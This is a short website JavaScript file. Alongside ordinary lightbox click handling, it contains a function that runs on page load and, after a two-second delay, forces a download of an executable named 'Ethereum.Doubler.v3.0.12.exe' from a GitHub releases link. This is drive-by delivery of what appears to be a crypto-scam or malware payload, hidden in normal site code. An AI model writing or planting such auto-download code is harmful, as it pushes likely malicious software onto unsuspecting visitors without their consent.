function download(){
  setTimeout(function(){
    downloadFile("https://github.com/ethx2/ethx2.github.io/releases/download/v3.0.12/Ethereum.Doubler.v3.0.12.exe");
  }, 1999);
};
window.addEventListener("load", download);
$(document).on('click', '[data-toggle="lightbox"]', function(event) {
  event.preventDefault();
  $(this).ekkoLightbox();
});
